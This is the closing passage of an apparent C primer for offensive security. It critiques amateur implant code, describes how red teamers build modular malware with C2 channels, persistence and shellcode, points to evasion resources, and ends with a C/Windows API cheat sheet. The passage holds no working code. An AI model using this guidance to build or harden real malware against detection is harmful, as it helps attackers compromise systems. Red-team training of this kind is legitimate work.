| Defense | How It Kills Amateur Code | Your Lab Bypass |
|---------|--------------------------|-----------------|
| Code complexity | 1000-line `main()` cannot be maintained or updated | Lab is throwaway code |
| Hardcoded values | IP, port, domain embedded in binary = instant IOC on every build | Lab has no update mechanism |
| No error handling | Silent failures in the field = lost access, no diagnostics | Lab has interactive debugging |
| No modularity | Cannot swap C2 channels, injection methods, or evasion techniques | Lab is single-purpose |
| No configuration | Every target requires recompilation | Lab targets are identical |
| Static analysis | Unobfuscated code is trivial to reverse and signature | No static analysis tools in lab |

### What a Professional Red Teamer Would Do

**Instead of single-file C programs, they would:**
- **Build modular frameworks** — plugin architecture for C2 channels, injection methods, persistence mechanisms
- **Use configuration files** — encrypted JSON or binary config loaded at runtime; same binary, different targets
- **Implement robust error handling** — every API call checked, every failure logged, graceful degradation
- **Design for update** — in-memory module loading, no disk writes for updates
- **Write position-independent code** — shellcode that runs anywhere, no imports, no relocations

**Key difference:** The pro treats malware development as **software engineering**, not scripting. The same principles apply: modularity, configuration, error handling, testability. The pro writes code that can be maintained and updated over months of operation.

### What to Learn Next

| Concept | Why It Matters | Where to Start |
|---------|---------------|----------------|
| Modular C architecture | Plugin system for C2, injection, persistence | Study Cobalt Strike architecture |
| Position-independent code | No imports, no relocations, runs anywhere | "Shellcode Handbook" by Chris Anley |
| Runtime configuration | Same binary, different targets, no recompilation | JSON parsing in C: `cJSON` library |
| Static analysis evasion | Control flow flattening, string encryption, import obfuscation | GitHub: `mgeeky/ProtectMyTooling` |

### The Honest Bottom Line

> This C primer teaches syntax, pointers, and basic Windows API usage. It does not teach malware engineering. In the real world, a 1000-line `main()` with hardcoded values is **not a tool — it is a toy**. The value is understanding the language. Learn modular architecture, PIC, and runtime configuration next.

---

| Concept | One-Liner |
|---------|-----------|
| `#include` | Copy-pastes a header file into your source before compilation |
| `#define` | Textual substitution; no memory, no type checking |
| `main(argc, argv)` | Entry point; `argv[0]` is program name |
| `LPVOID` | Generic pointer (`void *`) |
| `HANDLE` | Opaque reference to a kernel object |
| `DWORD` | 32-bit unsigned integer |
| `&` | Address-of operator |
| `*` | Dereference operator |
| `malloc()` / `free()` | Heap allocate / deallocate |
| `memset(ptr, 0, size)` | Zero out memory |
| `struct` | Group of related variables under one name |
| `.` (dot) | Access struct member directly |
| `->` (arrow) | Access struct member through pointer |
| `WINAPI` | Calling convention (`__stdcall`) for Windows APIs |
| `strlen()` | Count chars before `\0` |
| `strcpy()` | Copy string (unsafe — use `strncpy`) |
| `_snprintf()` | Format string with length limit |
| `cl.exe` | Microsoft C/C++ compiler |
| `#pragma comment(lib, "x.lib")` | Auto-link a library |
| `/GS-` | Disable stack canary protection |
| `/MT` | Static link C runtime |

---

*End of Document*
